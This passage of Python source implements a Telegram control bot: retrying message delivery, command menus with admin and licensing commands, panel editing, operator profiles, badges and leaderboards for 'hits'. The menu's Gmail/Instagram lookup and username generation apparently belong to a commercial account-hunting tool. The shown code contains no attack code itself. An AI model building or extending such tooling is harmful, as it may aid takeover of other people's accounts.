        return None
    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
    if not target:
        return None
    payload = {"chat_id": target, "text": text, "parse_mode": parse_mode}
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup
    return telegram_post_with_retries(
        "sendMessage",
        payload,
        timeout=TG_INSTANT_TIMEOUT,
        max_retries=TG_INSTANT_MAX_RETRIES,
        label="TG INST",
    )


def telegram_poll_get_updates(offset):
    """Single long-poll call — no retry backoff (retrying getUpdates causes multi-minute lag)."""
    if not TELEGRAM_ENABLED or not TELEGRAM_API_URL:
        return None
    try:
        return requests.post(
            f"{TELEGRAM_API_URL}/getUpdates",
            data={
                "timeout": 20,
                "offset": offset,
                "allowed_updates": json.dumps(["message", "callback_query", "my_chat_member"]),
            },
            timeout=TG_POLL_HTTP_TIMEOUT,
        )
    except Exception as exc:
        log_event("TG POLL", str(exc)[:80])
        return None


def deliver_hit_to_telegram(caption, hit_keyboard, photo_bytes=None, content_type="image/jpeg"):
    """Send hit alert with up to TG_HIT_MAX_RETRIES — never give up on first network blip."""
    if not TELEGRAM_ENABLED:
        return False

    if photo_bytes:
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(hit_keyboard),
        }
        data = telegram_disable_link_preview(data, "sendPhoto")
        files = {"photo": ("profile.jpg", photo_bytes, content_type)}
        resp = telegram_post_with_retries(
            "sendPhoto",
            data=data,
            files=files,
            timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
            max_retries=TG_HIT_MAX_RETRIES,
            label="HIT PHOTO",
        )
        if resp is not None:
            return True

    text_data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": caption,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(hit_keyboard),
    }
    text_data = telegram_disable_link_preview(text_data, "sendMessage")
    resp = telegram_post_with_retries(
        "sendMessage",
        data=text_data,
        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
        max_retries=TG_HIT_MAX_RETRIES,
        label="HIT MSG",
    )
    return resp is not None


def ensure_telegram_polling_mode():
    """Long-poll needs no webhook; avoids 'bot dead' when webhook + poll clash."""
    if not TELEGRAM_API_URL:
        return
    try:
        requests.get(
            f"{TELEGRAM_API_URL}/deleteWebhook",
            params={"drop_pending_updates": "false"},
            timeout=5,
        )
    except Exception:
        pass


def _normalize_bot_command_menu(items):
    menu = []
    for cmd, desc in items:
        cmd = re.sub(r"[^a-z0-9_]", "", (cmd or "").lower())[:32]
        desc = (desc or cmd)[:256]
        if len(cmd) >= 1 and len(desc) >= 3:
            menu.append({"command": cmd, "description": desc})
    return menu[:100]


def build_telegram_command_menu(*, include_admin=False):
    """Slash-menu entries for private chats (Telegram / suggestions)."""
    items = [
        ("start", "Welcome panel & dashboard"),
        ("stats", "Live hunt dashboard"),
        ("status", "Quick status snapshot"),
        ("check", "Health check — why 0 generated?"),
        ("verify", "Verify joins & unlock access"),
        ("mylicense", "License expiry & status"),
        ("plan", "Free trial & daily usage"),
        ("redeem", "Activate Premium license key"),
        ("hitgroup", "Hit group status (DM)"),
        ("pause", "Pause workers"),
        ("resume", "Resume hunt"),
        ("hits", "Recent captures"),
        ("saved", "Favorites list & file"),
        ("profile", "Operator profile"),
        ("leaderboard", "Global rankings"),
        ("badges", "Achievements"),
        ("settings", "Min followers · timeout · threads"),
        ("analytics", "Deep session stats"),
        ("health", "Backend health check"),
        ("api", "API gateway probe"),
        ("cloud", "Supabase sync status"),
        ("export", "Send hits.txt file"),
        ("live", "Auto-refresh on or off"),
        ("reset", "Reset session counters"),
        ("logout", "Log out (confirmation)"),
        ("lookup", "Gmail / Instagram lookup"),
        ("gen", "Generate usernames"),
        ("help", "Full command guide"),
    ]
    if include_admin:
        items.extend([
            ("admin", "Admin overview"),
            ("adminhelp", "Admin command guide"),
            ("set", "Cloud & bot settings"),
            ("force", "Add force-join channel"),
            ("forcelist", "List force-join targets"),
            ("forcedel", "Remove force-join target"),
            ("ban", "Ban operator"),
            ("unban", "Unban operator"),
            ("users", "List operators"),
            ("broadcast", "Message all operators"),
            ("adminstats", "Platform statistics"),
            ("rebrand", "Rebrand operator bots"),
            ("licensegen", "Generate license key"),
            ("grant", "Grant license to user ID"),
            ("revoke", "Revoke user license"),
            ("licenseinfo", "License info for user"),
            ("licenses", "List active licenses"),
            ("licensekeys", "List unused keys"),
        ])
    return _normalize_bot_command_menu(items)


def build_telegram_group_command_menu():
    """Slash suggestions inside groups (hit group setup)."""
    return _normalize_bot_command_menu([
        ("check", "Health check — why 0 generated?"),
        ("hitgroup", "Link this group for hits"),
        ("setgroup", "Same as hitgroup"),
        ("verifyhitgroup", "Confirm bot is admin here"),
        ("check", "Health check & friendly fixes"),
        ("stats", "Live dashboard"),
        ("status", "Quick status"),
        ("help", "Command guide"),
    ])


def _telegram_set_commands(commands, scope):
    if not TELEGRAM_API_URL or not commands:
        return False
    try:
        response = requests.post(
            f"{TELEGRAM_API_URL}/setMyCommands",
            data={
                "commands": json.dumps(commands),
                "scope": json.dumps(scope),
            },
            timeout=10,
        )
        if response.ok:
            return True
        log_event("TG CMDS", f"{scope.get('type')}: {response.text[:80]}")
    except Exception as exc:
        log_event("TG CMDS", str(exc)[:100])
    return False


def sync_telegram_command_menu(user_id=None):
    """Push / menu to Telegram (private + group scopes)."""
    if not TELEGRAM_API_URL:
        return False
    user_id = str(user_id or TELEGRAM_CHAT_ID or "").strip()
    if not user_id or not user_id.lstrip("-").isdigit():
        return False
    try:
        admin_load_settings()
        include_admin = admin_is_admin(user_id)
        private_cmds = build_telegram_command_menu(include_admin=include_admin)
        operator_cmds = build_telegram_command_menu(include_admin=False)
        group_cmds = build_telegram_group_command_menu()
        ok = True
        ok = _telegram_set_commands(operator_cmds, {"type": "default"}) and ok
        ok = _telegram_set_commands(operator_cmds, {"type": "all_private_chats"}) and ok
        ok = _telegram_set_commands(group_cmds, {"type": "all_group_chats"}) and ok
        ok = _telegram_set_commands(
            private_cmds,
            {"type": "chat", "chat_id": int(user_id)},
        ) and ok
        if include_admin:
            admin_cmds = build_telegram_command_menu(include_admin=True)
            ok = _telegram_set_commands(
                admin_cmds,
                {"type": "chat", "chat_id": int(user_id)},
            ) and ok
        return ok
    except Exception as exc:
        log_event("TG CMDS", str(exc)[:100])
    return False


def schedule_sync_telegram_commands(user_id=None):
    """Background — never block poll or command replies."""
    if not TELEGRAM_API_URL:
        return
    uid = str(user_id or TELEGRAM_CHAT_ID or "").strip()
    if not uid:
        return
    threading.Thread(
        target=sync_telegram_command_menu,
        args=(uid,),
        daemon=True,
    ).start()


def send_telegram_text(text, reply_markup=None, parse_mode="HTML", *, chat_id=None):
    if not TELEGRAM_ENABLED:
        return None
    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
    if not target:
        return None
    payload = {
        "chat_id": target,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup
    return send_telegram_request("sendMessage", data=payload)


def send_telegram_text_to_chat(chat_id, text, reply_markup=None):
    return send_telegram_text(text, reply_markup=reply_markup, chat_id=chat_id)


def telegram_sent_message_id(response):
    if response is None or not response.ok:
        return None
    try:
        return response.json().get("result", {}).get("message_id")
    except Exception:
        return None


def remember_startup_panel(chat_id=None, message_id=None, response=None, has_photo=None):
    """Welcome photo/text on boot — only /start refreshes this, not slash commands."""
    if response is not None:
        message_id = telegram_sent_message_id(response) or message_id
        if has_photo is None and response.ok:
            try:
                result = response.json().get("result") or {}
                has_photo = bool(result.get("photo"))
            except Exception:
                pass
    if chat_id is None:
        chat_id = TELEGRAM_CHAT_ID
    if message_id:
        STARTUP_PANEL["chat_id"] = str(chat_id)
        STARTUP_PANEL["message_id"] = message_id
    if has_photo is not None:
        STARTUP_PANEL["has_photo"] = bool(has_photo)


def _panel_is_startup_target(chat_id, message_id):
    if not chat_id or not message_id:
        return False
    return (
        str(chat_id) == str(STARTUP_PANEL.get("chat_id"))
        and message_id == STARTUP_PANEL.get("message_id")
    )


def remember_cmd_panel(chat_id=None, message_id=None, response=None):
    """Track last dashboard panel so operator commands can edit in place (not startup)."""
    is_photo = False
    if response is not None:
        message_id = telegram_sent_message_id(response) or message_id
        if response.ok:
            try:
                result = response.json().get("result") or {}
                is_photo = bool(result.get("photo"))
            except Exception:
                pass
    if chat_id is None:
        chat_id = TELEGRAM_CHAT_ID
    if message_id:
        if _panel_is_startup_target(chat_id, message_id):
            return
        CMD_REPLY_PANEL["chat_id"] = str(chat_id)
        CMD_REPLY_PANEL["message_id"] = message_id
        CMD_REPLY_PANEL["is_photo"] = is_photo


def _sync_live_panel_from_reply_markup(reply_markup):
    if not reply_markup:
        return
    for row in reply_markup.get("inline_keyboard", []):
        for btn in row:
            if btn.get("callback_data") in LIVE_DASHBOARD_CALLBACKS:
                remember_cmd_panel(
                    CMD_REPLY_PANEL.get("chat_id"),
                    CMD_REPLY_PANEL.get("message_id"),
                )
                LIVE_PANEL["chat_id"] = CMD_REPLY_PANEL["chat_id"]
                LIVE_PANEL["message_id"] = CMD_REPLY_PANEL["message_id"]
                LIVE_PANEL["view"] = "stats"
                return


def _set_operator_cmd_context(chat_id=None, chat_type=None, actor_id=None):
    _operator_cmd_ctx.reply_chat_id = str(chat_id) if chat_id else None
    _operator_cmd_ctx.chat_type = chat_type or "private"
    _operator_cmd_ctx.actor_id = str(actor_id) if actor_id else None


def _clear_operator_cmd_context():
    _operator_cmd_ctx.reply_chat_id = None
    _operator_cmd_ctx.chat_type = None
    _operator_cmd_ctx.actor_id = None


def operator_reply_chat_id():
    cid = getattr(_operator_cmd_ctx, "reply_chat_id", None)
    return str(cid) if cid else str(TELEGRAM_CHAT_ID or "")


def operator_command_in_group():
    return getattr(_operator_cmd_ctx, "chat_type", None) in ("group", "supergroup")


def is_linked_operator(user_id):
    op = resolve_operator_telegram_id()
    return bool(op and str(user_id or "").strip() == str(op).strip())


def can_control_operator_bot(user_id):
    """Linked operator or INPARETO admin may use this operator bot."""
    user_id = str(user_id or "").strip()
    if not user_id:
        return False
    if is_linked_operator(user_id):
        return True
    return admin_is_admin(user_id)


def _track_operator_cmd_panel(chat_id, actor=None):
    cid = str(chat_id or "")
    if cid == str(TELEGRAM_CHAT_ID or ""):
        return True
    if actor and admin_is_admin(actor) and cid == str(actor):
        return True
    return False


def normalize_bot_command_text(text):
    """Strip /cmd@BotName → /cmd so group commands work with BotFather privacy."""
    raw = (text or "").strip()
    if not raw or not raw.startswith("/"):
        return raw
    parts = raw.split()
    token = parts[0]
    if "@" in token:
        parts[0] = token.split("@", 1)[0]
        return " ".join(parts)
    return raw


def bot_command_reply(text, reply_markup=None, *, remove_markup=False, chat_id=None, **_legacy):
    """Slash commands always send a new Telegram message (never edit an old panel)."""
    if not TELEGRAM_ENABLED:
        return None
    if chat_id is None:
        chat_id = operator_reply_chat_id()
    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
    if not target:
        return None
    markup = {"inline_keyboard": []} if remove_markup else reply_markup
    payload = {
        "chat_id": target,
        "text": text,
        "parse_mode": "HTML",
    }
    if markup is not None:
        payload["reply_markup"] = markup
    resp = telegram_post_with_retries(
        "sendMessage",
        payload,
        timeout=TG_SEND_TIMEOUT,
        max_retries=TG_BOT_CMD_MAX_RETRIES,
        label="TG BOT",
    )
    actor = getattr(_operator_cmd_ctx, "actor_id", None)
    if _track_operator_cmd_panel(chat_id, actor):
        remember_cmd_panel(response=resp)
        _sync_live_panel_from_reply_markup(reply_markup)
    return resp


HIT_GROUP_GROUP_COMMANDS = frozenset({
    "/hitgroup", "hitgroup", "/setgroup", "setgroup",
    "/verifyhitgroup", "verifyhitgroup",
})


def is_hit_group_command(text):
    head = _telegram_command_head(text)
    return head in HIT_GROUP_GROUP_COMMANDS or (text or "").strip().lower() in HIT_GROUP_GROUP_COMMANDS


def _telegram_command_head(text):
    raw = (text or "").strip().lower()
    if not raw:
        return ""
    token = raw.split()[0]
    if token.startswith("/"):
        return token.split("@")[0]
    return token


def is_hit_group_group_command(text):
    return is_hit_group_command(text)


def send_telegram_document(filepath, caption=None):
    if not TELEGRAM_ENABLED or not os.path.exists(filepath):
        return None
    try:
        with open(filepath, "rb") as doc:
            data = {"chat_id": TELEGRAM_CHAT_ID}
            if caption:
                data["caption"] = caption
                data["parse_mode"] = "HTML"
            return send_telegram_request(
                "sendDocument",
                data=data,
                files={"document": (os.path.basename(filepath), doc)},
            )
    except Exception as exc:
        log_event("TG ERR", str(exc)[:120])
        return None


TG_CAPTION_LIMIT = 1024


def _telegram_api_ok(response):
    if response is None:
        return False
    if response.ok:
        return True
    try:
        desc = response.json().get("description", "").lower()
        if "message is not modified" in desc:
            return True
    except Exception:
        pass
    return False


def panel_message_from_callback(callback):
    msg = callback.get("message") or {}
    chat = msg.get("chat") or {}
    return str(chat.get("id", "")), msg.get("message_id"), msg


def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup
    return send_telegram_request("editMessageText", data=payload)


def edit_telegram_caption(chat_id, message_id, caption, reply_markup=None, parse_mode="HTML"):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "caption": caption,
        "parse_mode": parse_mode,
    }
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup
    return send_telegram_request("editMessageCaption", data=payload)


def delete_telegram_message(chat_id, message_id):
    return send_telegram_request("deleteMessage", data={
        "chat_id": chat_id,
        "message_id": message_id,
    })


def update_panel_message(chat_id, message_id, text, reply_markup=None, source_message=None):
    """Edit the callback's message in place; fall back to send/delete if needed."""
    if not chat_id or not message_id:
        return send_telegram_text(text, reply_markup=reply_markup)

    is_photo = bool(source_message and source_message.get("photo"))
    if is_photo:
        if len(text) <= TG_CAPTION_LIMIT:
            response = edit_telegram_caption(chat_id, message_id, text, reply_markup=reply_markup)
            if _telegram_api_ok(response):
                return response
        delete_telegram_message(chat_id, message_id)
        return send_telegram_text(text, reply_markup=reply_markup)

    response = edit_telegram_message(chat_id, message_id, text, reply_markup=reply_markup)
    if _telegram_api_ok(response):
        return response
    return send_telegram_text(text, reply_markup=reply_markup)


def edit_panel_from_callback(
    callback, text, reply_markup=None, toast="Updated", show_alert=False,
):
    callback_id = callback.get("id")
    chat_id, message_id, msg = panel_message_from_callback(callback)
    if chat_id and str(chat_id) != TELEGRAM_CHAT_ID:
        return None
    answer_callback(callback_id, toast, show_alert=show_alert)
    resp = update_panel_message(chat_id, message_id, text, reply_markup, msg)
    remember_cmd_panel(chat_id, message_id)
    _sync_live_panel_from_reply_markup(reply_markup)
    return resp


def get_last_hits(limit=3):
    if not os.path.exists("hits.txt"):
        return "No saved hits available."
    with open("hits.txt", "r", encoding="utf-8", errors="ignore") as file:
        raw = file.read().strip()
    if not raw:
        return "No saved hits available."

    blocks = [block.strip() for block in raw.split("╚" + "═" * 60 + "╝") if block.strip()]
    recent = blocks[-limit:]
    if not recent:
        return "No saved hits available."
    formatted = []
    for block in recent:
        formatted.append(block + "\n╚" + "═" * 60 + "╝")
    return "\n\n".join(formatted)


def cloud_unavailable_message():
    return (
        format_panel_header()
        + "<b>Cloud sync required</b>\n\n"
        + "Set <code>SUPABASE_URL</code> and\n"
        + "<code>SUPABASE_ANON_KEY</code> at the top of joint.py,\n"
        + "then restart and link this device."
    )


def default_profile():
    oid = resolve_operator_id(TELEGRAM_CHAT_ID) or "unknown"
    now = datetime.now(timezone.utc).isoformat()
    info = fetch_telegram_user(oid) if oid != "unknown" else None
    display_name = (info or {}).get("display_name") or f"User {oid[-6:]}"
    return {
        "operator_id": oid,
        "display_name": display_name,
        "first_seen": now,
        "last_active": now,
        "last_active_date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "streak_days": 1,
        "achievements": [],
        "favorites": [],
        "favorite_notes": {},
        "lifetime": {
            "sessions_completed": 0,
            "total_hits": 0,
            "total_generated": 0,
            "total_runtime_sec": 0,
            "best_session_hits": 0,
            "best_hit_rate": 0.0,
            "best_hits_per_hour": 0.0,
            "best_hit_quality": 0,
            "quality_hits_3plus": 0,
            "quality_hits_4plus": 0,
            "quality_hits_5": 0,
        },
    }


def load_profile_data():
    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
    cache = load_profile_cache(oid)
    if not is_cloud_enabled():
        profile = default_profile()
        profile["operator_id"] = oid
        profile = merge_profile_records(profile, cache)
        profile["favorite_notes"] = load_local_favorite_notes()
        return profile
    profile, err = fetch_profile(oid)
    if err:
        log_event("CLOUD", err)
    if profile:
        profile = merge_profile_records(profile, cache)
        local_notes = load_local_favorite_notes()
        if local_notes:
            notes = dict(local_notes)
            notes.update(profile.get("favorite_notes") or {})
            profile["favorite_notes"] = notes
        if cache.get("last_milestone_hit"):
            profile["last_milestone_hit"] = cache["last_milestone_hit"]
        return profile
    profile = default_profile()
    profile["operator_id"] = oid
    profile = merge_profile_records(profile, cache)
    profile["favorite_notes"] = load_local_favorite_notes()
    return profile


def save_profile_data(data):
    global last_milestone_hit
    oid = str((data or {}).get("operator_id") or resolve_operator_id(TELEGRAM_CHAT_ID) or "").strip()
    if oid:
        data["operator_id"] = oid
    cache = load_profile_cache(oid) if oid else {}
    data = merge_profile_records(data, cache)
    if is_cloud_enabled() and oid:
        cloud_row, err = fetch_profile(oid)
        if err:
            log_event("CLOUD", err)
        if cloud_row:
            data = merge_profile_records(data, cloud_row)
    data["last_milestone_hit"] = max(
        int(data.get("last_milestone_hit") or 0), int(last_milestone_hit or 0)
    )
    save_profile_cache(data)
    if not is_cloud_enabled():
        return
    saved, err = upsert_profile(data)
    if err:
        log_event("CLOUD", err)
        return
    if saved:
        data = merge_profile_records(data, saved)
        save_profile_cache(data)


def get_operator_rank(lifetime_hits):
    if lifetime_hits >= 5000:
        return "Mythic", "★★"
    if lifetime_hits >= 1000:
        return "Warlord", "◆◆"
    if lifetime_hits >= 250:
        return "Apex Hunter", "▣▣"
    return "Rookie", "○"


def record_session_hit_timestamp():
    now = time.time()
    with lock:
        _session_hit_times.append(now)
        cutoff = now - SESSION_HIT_WINDOW_SEC
        while _session_hit_times and _session_hit_times[0] < cutoff:
            _session_hit_times.pop(0)


def session_hits_in_window(window_sec=SESSION_HIT_WINDOW_SEC):
    now = time.time()
    cutoff = now - window_sec
    with lock:
        while _session_hit_times and _session_hit_times[0] < cutoff:
            _session_hit_times.pop(0)
        return len(_session_hit_times)


def clear_session_hit_timestamps():
    with lock:
        _session_hit_times.clear()


def current_session_snapshot():
    elapsed = (datetime.now(timezone.utc) - START_TIME).total_seconds()
    with lock:
        generated = gen
        valid_count = valid
        hits_count = hit
        error_count = errors
    hit_rate = (hits_count / generated * 100) if generated else 0.0
    hits_last_60m = session_hits_in_window(SESSION_HIT_WINDOW_SEC)
    return {
        "started": START_TIME.isoformat(),
        "ended": datetime.now(timezone.utc).isoformat(),
        "generated": generated,
        "valid": valid_count,
        "hits": hits_count,
        "errors": error_count,
        "duration_sec": int(elapsed),
        "hit_rate": round(hit_rate, 2),
        "hits_last_60m": hits_last_60m,
    }


def profile_touch_activity(profile=None):
    now = datetime.now(timezone.utc)
    today = now.strftime("%Y-%m-%d")

    def _apply(data):
        last_date = data.get("last_active_date", today)
        if last_date == today:
            pass
        else:
            try:
                last_dt = datetime.strptime(last_date, "%Y-%m-%d").date()
                if (now.date() - last_dt).days == 1:
                    data["streak_days"] = data.get("streak_days", 0) + 1
                else:
                    data["streak_days"] = 1
            except Exception:
                data["streak_days"] = 1
        data["last_active"] = now.isoformat()
        data["last_active_date"] = today
        return data

    if profile is not None:
        return _apply(profile)
    with profile_lock:
        data = load_profile_data()
        save_profile_data(_apply(data))


def profile_init_on_startup():
    global last_milestone_hit
    if not is_device_ready():
        return
    with profile_lock:
        profile = load_profile_data()
        oid = resolve_operator_id(TELEGRAM_CHAT_ID)
        profile["operator_id"] = oid
        if is_device_style_name(profile.get("display_name")):
            info = fetch_telegram_user(oid)
            if info:
                profile["display_name"] = info["display_name"]
        if not profile.get("first_seen"):
            profile["first_seen"] = datetime.now(timezone.utc).isoformat()
        profile = profile_touch_activity(profile)
        save_profile_data(profile)
        last_milestone_hit = max(
            int(last_milestone_hit or 0),
            int(profile.get("last_milestone_hit") or 0),
            int(load_profile_cache(oid).get("last_milestone_hit") or 0),
        )


def profile_eval_achievements(profile, snap):
    unlocked = set(_normalize_achievements(profile.get("achievements")))
    new_unlocks = []
    lifetime_hits = profile["lifetime"]["total_hits"]
    life = profile["lifetime"]
    checks = [
        ("first_hit", lifetime_hits >= 1),
        ("hits_10", lifetime_hits >= 250),
        ("hits_50", lifetime_hits >= 1000),
        ("hits_100", lifetime_hits >= 5000),
        ("session_10", snap["hits"] >= 75),
        ("session_25", snap["hits"] >= 150),
        ("speed_20", snap["hits_last_60m"] >= 50),
        ("gen_1k", snap["generated"] >= 25000),
        ("clean_5", snap["hits"] >= 25 and snap["errors"] == 0),
        ("streak_3", profile.get("streak_days", 0) >= 14),
        ("streak_7", profile.get("streak_days", 0) >= 30),
        ("quality_3", life.get("quality_hits_3plus", 0) >= 75),
        ("quality_4", life.get("quality_hits_4plus", 0) >= 40),
        ("quality_5", life.get("quality_hits_5", 0) >= 15),
        ("quality_5_x5", life.get("quality_hits_5", 0) >= 50),
        ("quality_5_x10", life.get("quality_hits_5", 0) >= 150),
    ]
    for ach_id, ok in checks:
        if ok and ach_id not in unlocked:
            unlocked.add(ach_id)
            new_unlocks.append(ach_id)
    profile["achievements"] = sorted(unlocked)
    return new_unlocks


def profile_update_lifetime_peaks(profile, snap):
    life = profile["lifetime"]
    life["best_session_hits"] = max(life.get("best_session_hits", 0), snap["hits"])
    life["best_hit_rate"] = max(life.get("best_hit_rate", 0.0), snap["hit_rate"])
    burst = snap.get("hits_last_60m", 0)
    life["best_hits_per_hour"] = max(life.get("best_hits_per_hour", 0), burst)


def notify_achievement_unlock(ach_id):
    if ach_id not in ACHIEVEMENTS or not TELEGRAM_ENABLED:
        return
    name, desc, sym = ACHIEVEMENTS[ach_id]
    send_telegram_text(
        format_panel_header()
        + f"<b>{sym} Badge unlocked</b>\n\n"
        + tg_row("Title", name)
        + tg_row("Detail", desc),
    )


def _apply_hit_quality_to_lifetime(life, quality_stars):
    qs = max(1, min(5, int(quality_stars or 1)))
    life["best_hit_quality"] = max(life.get("best_hit_quality", 0), qs)
    if qs >= 3:
        life["quality_hits_3plus"] = life.get("quality_hits_3plus", 0) + 1
    if qs >= 4:
        life["quality_hits_4plus"] = life.get("quality_hits_4plus", 0) + 1
    if qs >= 5:
        life["quality_hits_5"] = life.get("quality_hits_5", 0) + 1
    return qs


def profile_record_hit(*, quality_stars=None):
    """Record a lifetime hit. Quality is applied separately after enrich when possible."""
    if not is_profile_tracking_ready():
        return
    record_session_hit_timestamp()
    snap = current_session_snapshot()
    new_unlocks = []
    with profile_lock:
        profile = load_profile_data()
        life = profile["lifetime"]
        life["total_hits"] = life.get("total_hits", 0) + 1
        if quality_stars is not None:
            _apply_hit_quality_to_lifetime(life, quality_stars)
        profile_update_lifetime_peaks(profile, snap)
        profile = profile_touch_activity(profile)
        new_unlocks = profile_eval_achievements(profile, snap)
        save_profile_data(profile)
    for ach_id in new_unlocks:
        notify_achievement_unlock(ach_id)


def profile_record_hit_quality(quality_stars):
    """Apply final hit quality after async enrich (or instant path without Telegram)."""
    if not is_profile_tracking_ready() or quality_stars is None:
        return
    snap = current_session_snapshot()
    new_unlocks = []
    with profile_lock:
        profile = load_profile_data()
        _apply_hit_quality_to_lifetime(profile["lifetime"], quality_stars)
        profile_update_lifetime_peaks(profile, snap)
        profile = profile_touch_activity(profile)
        new_unlocks = profile_eval_achievements(profile, snap)
        save_profile_data(profile)
    for ach_id in new_unlocks:
        notify_achievement_unlock(ach_id)


def profile_archive_session():
    if not is_device_ready():
        return
    snap = current_session_snapshot()
    if snap["generated"] == 0 and snap["hits"] == 0:
        return
    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
    err = insert_session(oid, snap)
    if err:
        log_event("CLOUD", err)
    with profile_lock:
        profile = load_profile_data()
        life = profile["lifetime"]
        life["sessions_completed"] = life.get("sessions_completed", 0) + 1
        life["total_generated"] = life.get("total_generated", 0) + snap["generated"]
        life["total_runtime_sec"] = life.get("total_runtime_sec", 0) + snap["duration_sec"]
        profile_update_lifetime_peaks(profile, snap)
        profile = profile_touch_activity(profile)
        new_unlocks = profile_eval_achievements(profile, snap)
        save_profile_data(profile)
    for ach_id in new_unlocks:
        notify_achievement_unlock(ach_id)


def format_profile():
    if not is_device_ready():
        return cloud_unavailable_message()
    with profile_lock:
        profile = load_profile_data()
    snap = current_session_snapshot()
    life = profile["lifetime"]
    rank, rank_sym = get_operator_rank(life.get("total_hits", 0))
    badge_count = len(profile.get("achievements", []))
    total_badges = len(ACHIEVEMENTS)
    first_seen = profile.get("first_seen", "")[:10]
    streak = profile.get("streak_days", 1)
    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
    global_rank, rank_err = fetch_operator_rank(oid)
    rank_line = f"#{global_rank} global" if global_rank and not rank_err else "—"

    vs_best = ""
    if life.get("best_session_hits", 0) > 0:
        diff = snap["hits"] - life["best_session_hits"]
        if diff >= 0:
            vs_best = f"+{diff} vs record"
        else:
            vs_best = f"{diff} vs record"

    return (
        format_panel_header()
        + f"<b>{S['btn_user']} Operator Profile</b>\n\n"
        + tg_row("Operator", telegram_profile_link_html(oid, profile.get("display_name")))
        + tg_row("Rank", f"{rank_sym} {rank}")
        + tg_row("Global", rank_line)
        + tg_row("Member since", first_seen)
        + tg_row("Active streak", f"{streak} day(s)")
        + tg_section("LIFETIME")
        + tg_row("Sessions", str(life.get("sessions_completed", 0)))
        + tg_row("Total hits", f"{life.get('total_hits', 0):,}")
        + tg_row("Total checks", f"{life.get('total_generated', 0):,}")
        + tg_row("Runtime", format_duration(life.get("total_runtime_sec", 0)))
        + tg_row("Best session", str(life.get("best_session_hits", 0)))
        + tg_row("Best hit rate", f"{life.get('best_hit_rate', 0):.2f}%")
        + tg_row("Best 60m burst", str(int(life.get("best_hits_per_hour", 0))))
        + tg_section("CURRENT SESSION")
        + tg_row("Hits", str(snap["hits"]))
        + tg_row("Checks", f"{snap['generated']:,}")
        + tg_row("Hit rate", f"{snap['hit_rate']:.2f}%")
        + tg_row("Hits (60m)", str(snap.get("hits_last_60m", 0)))
        + tg_row("Vs best", vs_best or "—")
        + tg_section("BADGES")
        + tg_row("Unlocked", f"{badge_count}/{total_badges}")
        + tg_section("FAVORITES")
        + tg_row("Saved", str(len(profile.get("favorites") or [])))
        + f"\n<i>Send <code>/saved</code> for <code>favorites.txt</code></i>\n"
    )


def format_operator_leaderboard():
    if not is_device_ready():
        return cloud_unavailable_message()
    entries, err = fetch_operator_leaderboard(10)
    lines = [
        format_panel_header(),
        f"<b>{S['btn_rank']} Global Operators</b>\n",
        "<i>All clients · ranked by lifetime hits</i>\n",
    ]
    if err:
        lines.append(f"<i>Cloud error: {html.escape(err)}</i>")
        return "".join(lines)
    if not entries:
        lines.append("<i>No operators on the board yet.</i>")
        return "".join(lines)
    medals = ("I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX", "X")
    me = resolve_operator_id(TELEGRAM_CHAT_ID)
    for idx, row in enumerate(entries):
        medal = medals[idx] if idx < len(medals) else str(idx + 1)
        op_id = row.get("id") or ""
        name_link = telegram_profile_link_html(op_id, row.get("display_name"))
        hits = row.get("lifetime_hits") or 0
        best = row.get("best_session_hits") or 0
        tag = " · you" if op_id == me else ""
        lines.append(
            f"  <code>{medal}</code>  {name_link}  "
            f"<code>{hits:,}</code> hits  best <code>{best}</code>{tag}\n"
        )
        schedule_operator_name_sync(op_id)
    return "".join(lines)


def format_session_leaderboard(scope="all"):
    if not is_device_ready():
        return cloud_unavailable_message()
    scope_label = {"day": "Today", "week": "This week", "all": "All time"}.get(scope, "All time")
    entries, err = fetch_session_leaderboard(scope, 10)
    lines = [
        format_panel_header(),
        f"<b>{S['btn_rank']} Global Sessions</b>\n",
        f"<i>{scope_label} · best runs worldwide</i>\n",
    ]
    if err:
        lines.append(f"<i>Cloud error: {html.escape(err)}</i>")
        return "".join(lines)
    if not entries:
        lines.append("<i>No ranked sessions yet.</i>")
        return "".join(lines)
    medals = ("I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX", "X")
    me = resolve_operator_id(TELEGRAM_CHAT_ID)
    snap = current_session_snapshot()
    for idx, entry in enumerate(entries):
        medal = medals[idx] if idx < len(medals) else str(idx + 1)
        hits = entry.get("hits") or 0
        rate = float(entry.get("hit_rate") or 0)
        dur = format_duration(entry.get("duration_sec") or 0)
        op = entry.get("operator_id") or "?"
        op_link = telegram_profile_link_html(op)
        tag = " · you" if op == me else ""
        try:
            when = datetime.fromisoformat(entry.get("ended_at", "")).strftime("%d %b %H:%M")
        except Exception:
            when = "—"
        lines.append(
            f"  <code>{medal}</code>  {op_link}  <b>{hits}</b> hits  "
            f"<code>{rate:.1f}%</code>  <code>{dur}</code>  "
            f"<i>{when}{tag}</i>\n"
        )
    if snap["hits"] > 0:
        lines.append(
            f"\n<i>{S['bullet']} Your live session: {snap['hits']} hits</i>"
        )
    return "".join(lines)


def format_leaderboard(scope="all"):
    global LEADERBOARD_MODE
    if LEADERBOARD_MODE == "operators":
        return format_operator_leaderboard()
    return format_session_leaderboard(scope)


def format_badges():
    if not is_device_ready():
        return cloud_unavailable_message()
    with profile_lock:
        profile = load_profile_data()
    unlocked = set(profile.get("achievements", []))
    lines = [format_panel_header(), f"<b>{S['btn_badge']} Badge Collection</b>\n"]

